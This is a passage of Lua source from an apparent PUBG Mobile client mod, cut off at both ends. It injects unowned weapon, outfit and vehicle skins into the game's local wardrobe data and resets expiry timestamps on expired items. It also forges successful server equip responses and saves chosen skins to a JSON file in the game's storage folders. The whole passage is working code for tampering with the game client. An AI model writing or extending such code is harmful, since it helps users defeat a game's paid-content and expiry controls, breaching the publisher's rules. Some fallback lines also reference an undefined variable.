        _G.CurrentEquipVehicleID = skinId
    end)
    if applied then F.scheduleChassisLightApply(vehicle, skinId) end
    return applied
end

function F.vehicleAvatarTemper()
    local vehicle = F.getCurrentVehicleForSkin()
    if not slua.isValid(vehicle) then return end
    local av = F.getVehicleAvatarComp(vehicle)
    if not slua.isValid(av) then return end

    local defaultId = 0
    pcall(function() defaultId = tonumber(av:GetDefaultAvatarID()) or 0 end)
    if defaultId <= 0 then return end

    local shape = nil
    pcall(function() shape = tonumber(import("AvatarUtils").GetVehicleShapeBySkinID(defaultId)) end)

    local skinId = nil
    if VEHSEL.override and slua.isValid(VEHSEL.overrideVehicle) and VEHSEL.overrideVehicle == vehicle then
        skinId = VEHSEL.override
    end
    if not skinId and shape then skinId = VEHSEL.byShape[shape] end
    if not skinId then skinId = F.getDesiredVehicleSkinForShape(shape) end
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 or skinId == defaultId then return end

    local cur = 0
    pcall(function() cur = tonumber(vehicle.GetAvatarId and vehicle:GetAvatarId()) or 0 end)
    if cur <= 0 then
        pcall(function() cur = tonumber(vehicle.GetVehicleSkinItemID and vehicle:GetVehicleSkinItemID()) or 0 end)
    end
    if cur == skinId then return end

    F.forceVehicleAvatar(skinId, vehicle)
end

function F.vehicleSkinTick()
    F.vehicleAvatarTemper()
    
    -- [FIX VIP] Paksa tampilkan Kacamata & Masker terus setiap 1 detik (Terlepas dari helm yang diambil)
    pcall(function()
        local char = F.getLocalChar()
        if char then F.matchApplyFaceWear(char) end
    end)

    local now = os.clock()
    if now - _vehTickLastApply < 5.0 then return end
    _vehTickLastApply = now
    F.applyVehicleSkinsToPC()
end

function F.startVehicleSkinTicker()
    pcall(function()
        if not _ticker then return end
        if _G.AddOutfitVehTickerId then return end
        if _ticker.AddTimerLoop then
            _G.AddOutfitVehTickerId = _ticker.AddTimerLoop(5.0, function()
                local fn = _G.AddOutfit and _G.AddOutfit.vehicleSkinTick
                if fn then pcall(fn) end
            end, -1, 1.0)
        end
    end)
end

function F.matchApplyVehicleSkin(skinId)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end

    local vehicle = F.getCurrentVehicleForSkin()

    VEHSEL.override = skinId
    VEHSEL.overrideVehicle = slua.isValid(vehicle) and vehicle or nil

    pcall(function()
        local UAvatarUtils = import("AvatarUtils")
        local shape = tonumber(UAvatarUtils.GetVehicleShapeBySkinID(skinId))
        if shape and shape >= 0 then VEHSEL.byShape[shape] = skinId end
        local av = F.getVehicleAvatarComp(vehicle)
        if slua.isValid(av) then
            local defaultId = tonumber(av:GetDefaultAvatarID()) or 0
            if defaultId > 0 then
                local defShape = tonumber(UAvatarUtils.GetVehicleShapeBySkinID(defaultId))
                if defShape and defShape >= 0 then VEHSEL.byShape[defShape] = skinId end
            end
        end
    end)

    F.applyVehicleSkinsToPC(F.getPC())
    local ok = F.forceVehicleAvatar(skinId, vehicle)
    F.startVehicleSkinTicker()
    return ok
end

function F.autoApplyVehicleSkinOnEnter(vehicle)
    if not slua.isValid(vehicle) then return end
    F.syncVehicleCacheFromDataMgr()
    F.applyVehicleSkinsToPC(F.getPC())
    F.startVehicleSkinTicker()
    F.later(0.35, function() pcall(F.vehicleAvatarTemper) end)
    F.later(0.9, function() pcall(F.vehicleAvatarTemper) end)
    F.later(0.5, function()
        local skinId = nil
        pcall(function() skinId = tonumber(vehicle.GetAvatarId and vehicle:GetAvatarId()) end)
        F.scheduleChassisLightApply(vehicle, skinId)
    end)
end

local function GetOutfitConfigPaths(fileName)
    local paths = {
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/Paks/puffer_temp/" .. fileName,
        "ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "../../ShadowTrackerExtra/Saved/Paks/" .. fileName
    }
    pcall(function()
        if os and os.getenv then
            local homeDir = os.getenv("HOME")
            if homeDir and homeDir ~= "" then
                table.insert(paths, 1, homeDir .. "/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName)
            end
        end
    end)
    return paths
end

local CONFIG_PATHS = GetOutfitConfigPaths("put_outfit.json")

local PERSIST_SLOTS = {
    { "outfit", "outfitRes", "outfitIns", "AddOutfitLastLobbyOutfitRes" },
    { "tshirt", "tshirtRes", "tshirtIns", "AddOutfitLastLobbyTshirtRes" },
    { "pants",  "pantsRes",  "pantsIns",  "AddOutfitLastLobbyPantsRes"  },
    { "shoes",  "shoesRes",  "shoesIns",  "AddOutfitLastLobbyShoesRes"  },
    { "hat",    "hatRes",    "hatIns",    "AddOutfitLastLobbyHatRes"    },
    { "mask",   "maskRes",   "maskIns",   "AddOutfitLastLobbyMaskRes"   },
    { "glass",  "glassRes",  "glassIns",  "AddOutfitLastLobbyGlassRes"  },
    { "bag",    "bagRes",    "bagIns",    "AddOutfitLastLobbyBagRes"    },
    { "helmet", "helmetRes", "helmetIns", "AddOutfitLastLobbyHelmetRes" },
    { "parachute", "parachuteRes", "parachuteIns", "AddOutfitLastLobbyParachuteRes" },
    { "glider", "gliderRes", "gliderIns", "AddOutfitLastLobbyGliderRes" },
    { "gloves", "glovesRes", "glovesIns", "AddOutfitLastLobbyGlovesRes" },
}

function F.isPersistableWearRes(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 then return false end
    if F.isInjectedRes(resID) then return true end
    if F.isParachuteRes(resID) or F.isGlideRes(resID) then return true end
    if PERSIST.configSlots then
        for _, v in pairs(PERSIST.configSlots) do
            if tonumber(v) == resID then return true end
        end
    end
    return false
end

function F.persistRememberSlot(slotName, resID)
    slotName = slotName and tostring(slotName)
    resID = tonumber(resID)
    if not slotName or not resID or resID <= 0 then return end
    PERSIST.configSlots = PERSIST.configSlots or {}
    PERSIST.configSlots[slotName] = resID
end

function F.persistForgetSlot(slotName)
    if PERSIST.configSlots and slotName then
        PERSIST.configSlots[tostring(slotName)] = nil
    end
end

function F.persistLoadSlotsFromSaved(saved)
    if type(saved) ~= "table" then return end
    PERSIST.configSlots = PERSIST.configSlots or {}
    for _, s in ipairs(PERSIST_SLOTS) do
        local res = tonumber(saved[s[1]])
        if res and res > 0 then PERSIST.configSlots[s[1]] = res end
    end
    F.applyPersistSlotsToCache()
end

function F.resolveInsForRes(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 then return nil end
    if R.resToIns[resID] then return R.resToIns[resID] end
    local ins
    pcall(function()
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local list = wd.GetHallDepotItemListByResID and wd:GetHallDepotItemListByResID(resID)
        if list then
            for _, v in pairs(list) do
                local id = tonumber(v.insID or v.instid or v.ins_id)
                if id and id > 0 then ins = id break end
            end
        end
        if not ins then
            local d = wd.GetValidHallDepotItemDataByInsID and wd:GetValidHallDepotItemDataByInsID(resID)
            if not d and wd.GetHallDepotItemDataByResID then
                d = wd:GetHallDepotItemDataByResID(resID)
            end
            if d then ins = tonumber(d.insID or d.instid or d.ins_id) end
        end
    end)
    return ins
end

function F.applyPersistSlotsToCache()
    if not PERSIST.configSlots then return end
    local cch = F.cache()
    for _, s in ipairs(PERSIST_SLOTS) do
        local slotName, cacheResKey, cacheInsKey, globalKey = s[1], s[2], s[3], s[4]
        local res = tonumber(PERSIST.configSlots[slotName])
        if res and res > 0 then
            cch[cacheResKey] = res
            _G[globalKey] = res
            local ins = F.resolveInsForRes(res)
            if ins and ins > 0 then cch[cacheInsKey] = ins end
        end
    end
end

function F.getDesiredGliderRes()
    F.applyPersistSlotsToCache()
    local r = tonumber(PERSIST.configSlots and PERSIST.configSlots.glider)
    if r and r > 0 then return r end
    F.syncAirborneCacheFromLobby()
    return F.getDesiredWear("gliderRes", "gliderRes", "AddOutfitLastLobbyGliderRes")
end

function F.getDesiredParachuteRes()
    F.applyPersistSlotsToCache()
    local r = tonumber(PERSIST.configSlots and PERSIST.configSlots.parachute)
    if r and r > 0 then return r end
    F.syncAirborneCacheFromLobby()
    return F.getDesiredWear("parachuteRes", "parachuteRes", "AddOutfitLastLobbyParachuteRes")
end

function F.getAvatarComp2(char)
    if not char or not slua.isValid(char) then return nil end
    local comp
    pcall(function()
        if char.getAvatarComponent2 then
            comp = char:getAvatarComponent2()
        end
        if (not comp or not slua.isValid(comp)) and char.AvatarComponent2 then
            comp = char.AvatarComponent2
        end
        if (not comp or not slua.isValid(comp)) and char.CharacterAvatarComp2_BP then
            comp = char.CharacterAvatarComp2_BP
        end
    end)
    return comp
end

function F.isCharacterAirborne(char)
    if not char or not slua.isValid(char) then return false end
    local ok, r = pcall(function()
        local EParachuteState = import("EParachuteState")
        local st = char.ParachuteState
        return st and st ~= EParachuteState.PS_None
    end)
    return ok and r == true
end

function F.reapplyWeaponsFromConfig()
    local wmap = F.sanitizeConfigWeapons(PERSIST.configWeapons)
    local dropped = false
    for k in pairs(PERSIST.configWeapons or {}) do
        if not wmap[tonumber(k) or k] then dropped = true break end
    end
    PERSIST.configWeapons = wmap
    if dropped then F.persistMarkDirty() end
    if not next(wmap) then return false end
    local cch = F.cache()
    local any = false
    for wid0, res0 in pairs(wmap) do
        local wid, res = tonumber(wid0), tonumber(res0)
        local ins = res and R.resToIns[res]
        if wid and ins and F.isInjectedIns(ins) then
            cch.weapons[wid] = { resID = res, insID = ins }
            if F.equipWeaponSkin(wid, ins) then
                any = true
            else
                F.syncWeaponArmorySilent(wid, ins)
            end
        end
    end
    return any
end

function F.persistEncode()
    local cch = F.cache()
    local parts = {}
    for _, s in ipairs(PERSIST_SLOTS) do
        local res = tonumber(PERSIST.configSlots and PERSIST.configSlots[s[1]])
            or tonumber(cch[s[2]])
        if res and res > 0 and F.isPersistableWearRes(res) then
            parts[#parts + 1] = string.format('  "%s": %d', s[1], res)
        end
    end
    local wparts = {}
    local wmap = {}
    for wid, res in pairs(F.sanitizeConfigWeapons(PERSIST.configWeapons)) do
        wmap[wid] = res
    end
    for wid0, w in pairs(cch.weapons or {}) do
        local res = w and tonumber(w.resID)
        local wid = tonumber(wid0)
        if F.isValidWeaponPersistEntry(wid, res) then wmap[wid] = res end
    end
    for wid, res in pairs(wmap) do
        wparts[#wparts + 1] = string.format('    "%d": %d', wid, res)
    end
    table.sort(wparts)
    parts[#parts + 1] = '  "weapons": {\n' .. table.concat(wparts, ",\n") .. "\n  }"
    local vparts = {}
    local function appendVehicleSlots(src)
        for subType, slots in pairs(src or {}) do
            local sparts = {}
            if type(slots) == "table" then
                for idx, val in pairs(slots) do
                    local res = type(val) == "table" and tonumber(val.resID) or tonumber(val)
                    if res and res > 0 then
                        sparts[#sparts + 1] = string.format('      "%d": %d', tonumber(idx), res)
                    end
                end
            end
            table.sort(sparts)
            if #sparts > 0 then
                vparts[#vparts + 1] = string.format('    "%d": {\n%s\n    }', tonumber(subType), table.concat(sparts, ",\n"))
            end
        end
    end
    local hasCacheSlots = false
    for _ in pairs(cch.vehicleSlots or {}) do hasCacheSlots = true; break end
    if hasCacheSlots then
        appendVehicleSlots(cch.vehicleSlots)
    elseif PERSIST.configVehicleSlots then
        appendVehicleSlots(PERSIST.configVehicleSlots)
    end
    table.sort(vparts)
    parts[#parts + 1] = '  "vehicleSlots": {\n' .. table.concat(vparts, ",\n") .. "\n  }"
    if PERSIST.lobbyVehicleSubType and PERSIST.lobbyVehicleSubType > 0
        and PERSIST.lobbyVehicleSubType ~= CHASSIS_LIGHT_SUB
        and not F.isChassisLightId(PERSIST.lobbyVehicleResID)
        and F.isVehicleRes(PERSIST.lobbyVehicleResID) then
        parts[#parts + 1] = string.format('  "lobbyVehicleSubType": %d', PERSIST.lobbyVehicleSubType)
    end
    if PERSIST.lobbyVehicleResID and PERSIST.lobbyVehicleResID > 0
        and F.isVehicleRes(PERSIST.lobbyVehicleResID) then
        parts[#parts + 1] = string.format('  "lobbyVehicleResID": %d', PERSIST.lobbyVehicleResID)
    end
    if PERSIST.lobbyVehicleIns and PERSIST.lobbyVehicleIns > 0
        and F.isVehicleRes(PERSIST.lobbyVehicleResID or R.insToRes[PERSIST.lobbyVehicleIns]) then
        parts[#parts + 1] = string.format('  "lobbyVehicleIns": %d', PERSIST.lobbyVehicleIns)
    end
    local hres = tonumber(cch.hallThemeRes) or tonumber(PERSIST.hallThemeResID)
    if hres and hres > 0 and F.isInjectedRes(hres) then
        parts[#parts + 1] = string.format('  "hallTheme": %d', hres)
    end
    local cl = tonumber(PERSIST.configChassisLight)
    if F.isChassisLightId(cl) then
        parts[#parts + 1] = string.format('  "chassisLight": %d', cl)
    end
    local cmap = PERSIST.configChassisLightMap
    if cmap and next(cmap) then
        local cparts = {}
        for vid0, lid in pairs(cmap) do
            local vid, lid = tonumber(vid0), tonumber(lid)
            if vid and vid > 0 and F.isChassisLightId(lid) then
                cparts[#cparts + 1] = string.format('    "%d": %d', vid, lid)
            end
        end
        table.sort(cparts)
        if #cparts > 0 then
            parts[#parts + 1] = '  "chassisLightMap": {\n' .. table.concat(cparts, ",\n") .. "\n  }"
        end
    end
    return "{\n" .. table.concat(parts, ",\n") .. "\n}\n"
end

function F.persistWrite(txt)
    if not (io and io.open) then return false end
    if PERSIST.path then
        local f
        pcall(function() f = io.open(PERSIST.path, "w") end)
        if f then f:write(txt) f:close() return true end
        PERSIST.path = nil
    end
    for _, p in ipairs(CONFIG_PATHS) do
        local f
        pcall(function() f = io.open(p, "w") end)
        if not f then
            pcall(function()
                local dir = p:match("^(.*)/[^/]+$")
                if dir and os and os.execute then os.execute('mkdir -p "' .. dir .. '"') end
            end)
            pcall(function() f = io.open(p, "w") end)
        end
        if f then
            f:write(txt) f:close()
            PERSIST.path = p
            return true
        end
    end
    return false
end

function F.persistFlush()
    if not PERSIST.dirty then return end
    PERSIST.dirty = false
    pcall(function()
        local txt = F.persistEncode()
        if txt == PERSIST.lastWritten then return end
        if F.persistWrite(txt) then
            PERSIST.lastWritten = txt
        end
    end)
end

F.persistMarkDirty = function()
    PERSIST.dirty = true
    if PERSIST.scheduled then return end
    PERSIST.scheduled = true
    F.later(2.0, function()
        PERSIST.scheduled = false
        F.persistFlush()
    end)
end

function F.persistParse(txt)
    if not txt or #txt == 0 then return nil end
    local out = { weapons = {}, vehicleSlots = {} }
    local parsed = false
    pcall(function()
        local t = json and json.decode and json.decode(txt)
        if type(t) == "table" then
            for k, v in pairs(t) do
                if k == "weapons" and type(v) == "table" then
                    for wk, wv in pairs(v) do
                        local wid, res = tonumber(wk), tonumber(wv)
                        if F.isValidWeaponPersistEntry(wid, res) then out.weapons[wid] = res end
                    end
                elseif k == "vehicleSlots" and type(v) == "table" then
                    for stk, slotMap in pairs(v) do
                        local st = tonumber(stk)
                        if st then
                            out.vehicleSlots[st] = out.vehicleSlots[st] or {}
                            for idxStr, res in pairs(slotMap) do
                                local idx, r = tonumber(idxStr), tonumber(res)
                                if idx and r and r > 0 then out.vehicleSlots[st][idx] = r end
                            end
                        end
                    end
                elseif k == "chassisLightMap" and type(v) == "table" then
                    out.chassisLightMap = {}
                    for vk, lv in pairs(v) do
                        local vid, lid = tonumber(vk), tonumber(lv)
                        if vid and lid and F.isChassisLightId(lid) then
                            out.chassisLightMap[vid] = lid
                        end
                    end
                else
                    local n = tonumber(v)
                    if n and n > 0 then out[k] = n end
                end
            end
            parsed = true
        end
    end)
    if not parsed then
        for k, v in txt:gmatch('"([%w_]+)"%s*:%s*(%d+)') do
            local n = tonumber(v)
            if n and n > 0 then
                local wid = tonumber(k)
                if wid and F.isValidWeaponPersistEntry(wid, n) then
                    out.weapons[wid] = n
                elseif not wid then
                    out[k] = n
                end
            end
        end
    end
    return out
end

function F.persistLoadFromDisk()
    if not (io and io.open) then return end
    pcall(function()
        for _, p in ipairs(CONFIG_PATHS) do
            local f
            pcall(function() f = io.open(p, "r") end)
            if f then
                local txt = f:read("*a")
                f:close()
                PERSIST.path = p
                PERSIST.lastWritten = txt
                PERSIST.loaded = F.persistParse(txt)
                F.persistLoadSlotsFromSaved(PERSIST.loaded)
                if PERSIST.loaded and PERSIST.loaded.vehicleSlots then
                    PERSIST.configVehicleSlots = PERSIST.loaded.vehicleSlots
                end
                if PERSIST.loaded and PERSIST.loaded.weapons then
                    local raw = PERSIST.loaded.weapons
                    PERSIST.configWeapons = F.sanitizeConfigWeapons(raw)
                    if next(raw) and not next(PERSIST.configWeapons) then
                        F.persistMarkDirty()
                    elseif next(raw) then
                        for wid, res in pairs(raw) do
                            if not F.isValidWeaponPersistEntry(tonumber(wid), tonumber(res)) then
                                F.persistMarkDirty()
                                break
                            end
                        end
                    end
                end
                PERSIST.lobbyVehicleSubType = tonumber(PERSIST.loaded and PERSIST.loaded.lobbyVehicleSubType)
                PERSIST.lobbyVehicleResID = tonumber(PERSIST.loaded and PERSIST.loaded.lobbyVehicleResID)
                PERSIST.lobbyVehicleIns = tonumber(PERSIST.loaded and PERSIST.loaded.lobbyVehicleIns)
                if PERSIST.lobbyVehicleSubType or PERSIST.lobbyVehicleIns or PERSIST.lobbyVehicleResID then
                    if F.isChassisLightId(PERSIST.lobbyVehicleResID)
                        or PERSIST.lobbyVehicleSubType == CHASSIS_LIGHT_SUB
                        or not F.isVehicleRes(PERSIST.lobbyVehicleResID) then
                        PERSIST.lobbyVehicleSubType = nil
                        PERSIST.lobbyVehicleResID = nil
                        PERSIST.lobbyVehicleIns = nil
                    else
                        _G.AddOutfitLobbyVeh = _G.AddOutfitLobbyVeh or {}
                        _G.AddOutfitLobbyVeh.manual = true
                        _G.AddOutfitLobbyVeh.subType = PERSIST.lobbyVehicleSubType
                        _G.AddOutfitLobbyVeh.resID = PERSIST.lobbyVehicleResID
                        _G.AddOutfitLobbyVeh.insID = PERSIST.lobbyVehicleIns
                    end
                end
                PERSIST.hallThemeResID = tonumber(PERSIST.loaded and PERSIST.loaded.hallTheme)
                PERSIST.hallThemeIns = nil
                if PERSIST.hallThemeResID then
                    _G.AddOutfitLobbyTheme = _G.AddOutfitLobbyTheme or {}
                    _G.AddOutfitLobbyTheme.manual = true
                    _G.AddOutfitLobbyTheme.resID = PERSIST.hallThemeResID
                end
                PERSIST.configChassisLight = tonumber(PERSIST.loaded and PERSIST.loaded.chassisLight)
                if PERSIST.loaded and PERSIST.loaded.chassisLightMap then
                    PERSIST.configChassisLightMap = PERSIST.loaded.chassisLightMap
                end
                return
            end
        end
    end)
end

function F.persistApplyLoaded()
    local saved = PERSIST.loaded
    if not saved then return end
    PERSIST.loaded = nil
    local cch = F.cache()
    local any = false
    for _, s in ipairs(PERSIST_SLOTS) do
        local res = tonumber(saved[s[1]]) or tonumber(PERSIST.configSlots and PERSIST.configSlots[s[1]])
        if res and res > 0 and not cch[s[2]] then
            local ins = R.resToIns[res]
            if ins then
                cch[s[2]], cch[s[3]] = res, ins
                _G[s[4]] = res
                any = true
            end
        end
    end
    PERSIST.configWeapons = F.sanitizeConfigWeapons(saved.weapons or PERSIST.configWeapons)
    if saved.weapons and F.reapplyWeaponsFromConfig() then
        any = true
    end
    if saved.vehicleSlots then
        PERSIST.configVehicleSlots = saved.vehicleSlots
        if F.reapplyVehicleSlotsFromConfig(true) then
            any = true
        end
    end
    if saved.hallTheme then
        PERSIST.hallThemeResID = tonumber(saved.hallTheme)
        if PERSIST.hallThemeResID and F.reapplyHallThemeFromConfig(true) then
            any = true
        end
    end
    if saved.chassisLight then
        PERSIST.configChassisLight = tonumber(saved.chassisLight)
    end
    if saved.chassisLightMap then
        PERSIST.configChassisLightMap = saved.chassisLightMap
    end
    if any then
        _matchApplied = false
        F.perfInvalidateLobby()
    end
end

function F.getEntity()
    local ok, dc = pcall(require, "client.slua.logic.wardrobe.logic_wardrobe_data_center")
    if not ok or not dc then return nil end
    local ok2, e = pcall(dc.GetWardrobeData)
    return ok2 and e or nil
end

function F.firstInsForRes(entity, resID)
    local arr = entity.ResIDToIndexArrayMap and entity.ResIDToIndexArrayMap[resID]
    if not arr then return nil end
    for _, idx in pairs(arr) do
        local d = entity._data[idx]
        if d and d.count and d.count > 0 then return d.insID end
    end
    return nil
end

function F.injectOne(entity, resID, insID)
    local ownedIns = F.firstInsForRes(entity, resID)
    if ownedIns then
        F.ensureInjectedItemAlive(entity, resID, ownedIns)
        R.resToIns[resID] = ownedIns
        R.insToRes[ownedIns] = resID
        F.indexWeaponSkin(resID, ownedIns)
        return true
    end
    local row = {
        instid = insID,
        res_id = resID,
        count = 1,
        lock_cnt = 0,
        isnew = 0,
        valid_hours = 0,
        expire_ts = 0,
    }
    entity:AddData(row)
    pcall(function()
        if entity.LoadConfigForData and CDataTable and CDataTable.GetTableData then
            local idx = entity._DataCount
            if idx and entity._data[idx] then
                entity:LoadConfigForData(entity._data[idx], CDataTable.GetTableData)
            end
        end
    end)
    R.insToRes[insID] = resID
    R.resToIns[resID] = insID
    F.indexWeaponSkin(resID, insID)
    return true
end

function F.reviveExpiredOwned(entity)
    entity = entity or F.getEntity()
    if not entity or not entity.bInit or not entity._data then return end
    local now = 0
    pcall(function()
        local TimeUtil = require("client.common.time_util")
        now = tonumber(TimeUtil.GetServerTimeInSec()) or 0
    end)
    if now <= 0 then return end
    _G.AddOutfitRevived = _G.AddOutfitRevived or {}
    local n = 0
    for i = 1, (entity._DataCount or #entity._data) do
        local d = entity._data[i]
        if d then
            local exp = tonumber(d.expire_ts or d.expireTS) or 0
            local res = tonumber(d.res_id or d.resID)
            local ins = tonumber(d.instid or d.insID)
            if exp > 0 and exp <= now and res and ins and (tonumber(d.count) or 0) > 0 then
                d.expire_ts = 0
                if d.expireTS ~= nil then d.expireTS = 0 end
                if d.valid_hours ~= nil then d.valid_hours = 0 end
                _G.AddOutfitRevived[res] = ins
                n = n + 1
            end
        end
    end
end

function F.mergeRevivedIntoMaps()
    for res, ins in pairs(_G.AddOutfitRevived or {}) do
        if not R.resToIns[res] then
            R.resToIns[res] = ins
            R.insToRes[ins] = res
            F.indexWeaponSkin(res, ins)
        end
    end
end

function F.injectArmory(resID, insID)
    local wid = F.weaponIdFromSkin(resID)
    if not wid then return end
    local Arm = require("client.logic.armory.logic_armory")
    Arm.rsp_list = Arm.rsp_list or { skin_list = {}, install_list = {} }
    Arm.rsp_list.skin_list = Arm.rsp_list.skin_list or {}
    Arm.rsp_list.install_list = Arm.rsp_list.install_list or {}
    if not Arm.rsp_list.skin_list[wid] then Arm.rsp_list.skin_list[wid] = {} end
    Arm.rsp_list.skin_list[wid][resID] = { is_open = 1 }
    Arm.WardrobeInsList = Arm.WardrobeInsList or {}
    Arm.WardrobeInsList[resID] = insID
end

function F.mergeInjectedArmorySkins()
    for _, skins in pairs(R.byWeapon) do
        for resID, insID in pairs(skins) do
            F.injectArmory(resID, insID)
        end
    end
end

function F.injectAll(entity)
    if _G.LexusConfig and _G.LexusConfig.ModSkin == false then return false end -- Lewati jika Mod Skin dimatikan
    entity = entity or F.getEntity()
    if not entity or not entity.bInit then return false end
    local n, nNew = 0, 0
    for i, resID in ipairs(ITEMS) do
        local insID = INS_BASE + i
        local had = R.resToIns[resID] ~= nil
        if F.injectOne(entity, resID, insID) then
            n = n + 1
            if not had then nNew = nNew + 1 end
            local c = F.cfg(resID)
            if GUN_SUB[F.subType(c)] or F.subType(c) == MELEE_ID then
                F.injectArmory(resID, insID)
            end
        end
    end
    if not _G.AddOutfitUnexpireDone then
        _G.AddOutfitUnexpireDone = true
        pcall(F.reviveExpiredOwned, entity)
    end
    F.mergeRevivedIntoMaps()
    F.sanitizeAllInjectedExpire()
    F.ensureInjectedResources()
    return n > 0
end

function F.refreshWardrobe()
    pcall(function()
        if EventSystem and EVENTTYPE_WARDROBE then
            if EVENTID_WARDROBE_UPDATE_ITEM_LIST then
                EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_ITEM_LIST)
            end
            if EVENTID_WARDROBE_UPDATE_AVATAR_LIST then
                EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_AVATAR_LIST)
            end
            if EVENTID_WARDROBE_UPDATE_GUN_LIST then
                EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_GUN_LIST, -1)
            end
        end
    end)
end

function F.refreshWardrobeOnce()
    if LOBBY.wardrobeRefreshed then return end
    LOBBY.wardrobeRefreshed = true
    F.refreshWardrobe()
end

function F.scheduleInjectRefresh()
    LOBBY.injectRefreshGen = (LOBBY.injectRefreshGen or 0) + 1
    local gen = LOBBY.injectRefreshGen
    F.later(0.4, function()
        if gen ~= LOBBY.injectRefreshGen then return end
        F.refreshWardrobe()
    end)
end

function F.putOnOutfit(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d0 = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d0 and tonumber(d.resID or d.res_id)
    end
    if not resID or resID <= 0 then return end
    if not R.insToRes[insID] then R.insToRes[insID] = resID; R.resToIns[resID] = insID end
    F.ensureDepotItemValid(insID, resID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    if not F.isSuitRes(resID) then
        if F.isTshirtRes(resID) then return F.putOnRoleWear(insID) end
        return
    end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not d then return end

    local suitFilter = function(r) return F.isSuitRes(r) end
    local oldIns, oldRes = F.findWornInsBySubType(OUTFIT_SUB, suitFilter)
    F.removeRoleWearBySubType(OUTFIT_SUB, suitFilter)
    F.saveEquip(resID, insID)

    local slot = PKG_SLOT
    pcall(function()
        local wfu = require("client.slua.logic.wardrobe.fashionbag.wardrobe_fashion_utils")
        local idx = wfu.GetRoleWearIndexBySubType and wfu:GetRoleWearIndexBySubType(OUTFIT_SUB)
        if idx then slot = idx end
    end)

    local olditem
    if oldIns and oldIns ~= insID then
        olditem = { res_id = oldRes or R.insToRes[oldIns], count = 1, instid = oldIns }
    end

    local WRH = require("client.network.Protocol.WardRobeHandler")
    local item = { res_id = resID, count = 1, instid = insID }
    WRH.on_depot_put_on_rsp(NET_OK, item, olditem, slot, insID, oldIns or 0)

    pcall(function()
        local av = require("client.slua.logic.wardrobe.logic_wardrobe_avatar")
        av:AddToWearInfo(OUTFIT_SUB, insID, resID, 0, 0)
        F.syncFashionBagRolewear()
    end)
end

function F.putOnHat(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d0 = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d0 and tonumber(d.resID or d.res_id)
    end
    if not resID or resID <= 0 then return end
    if not R.insToRes[insID] then R.insToRes[insID] = resID; R.resToIns[resID] = insID end
    F.ensureDepotItemValid(insID, resID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not d then return end
    local st = F.subType(F.cfg(resID)) or HAT_SUB

    local oldIns, oldRes = F.findWornInsBySubType(st)
    if not oldIns and st ~= HAT_SUB then
        oldIns, oldRes = F.findWornInsBySubType(HAT_SUB)
    end
    F.removeRoleWearBySubType(st)
    if st ~= HAT_SUB then F.removeRoleWearBySubType(HAT_SUB) end
    F.saveEquip(resID, insID)

    local slot = 1
    pcall(function()
        local wfu = require("client.slua.logic.wardrobe.fashionbag.wardrobe_fashion_utils")
        local idx = wfu.GetRoleWearIndexBySubType and wfu:GetRoleWearIndexBySubType(st)
        if idx then slot = idx end
    end)

    local olditem
    if oldIns and oldIns ~= insID then
        olditem = { res_id = oldRes or R.insToRes[oldIns], count = 1, instid = oldIns }
    end

    local WRH = require("client.network.Protocol.WardRobeHandler")
    local item = { res_id = resID, count = 1, instid = insID, color = d.color, pattern = d.pattern }
    WRH.on_depot_put_on_rsp(NET_OK, item, olditem, slot, insID, oldIns or 0)

    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        fbd:SetHeadShow(insID)
        F.syncFashionBagRolewear()
    end)
    F.invalidateSocialWearCache()
end

function F.putOnFaceAccessory(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d0 = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d0 and tonumber(d.resID or d.res_id)
    end
    if not resID or resID <= 0 then return end
    if not R.insToRes[insID] then R.insToRes[insID] = resID; R.resToIns[resID] = insID end
    F.ensureDepotItemValid(insID, resID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not d then return end
    local st = F.subType(F.cfg(resID)) or tonumber(d.itemSubType)
    if not FACE_SUBS[st] then return end

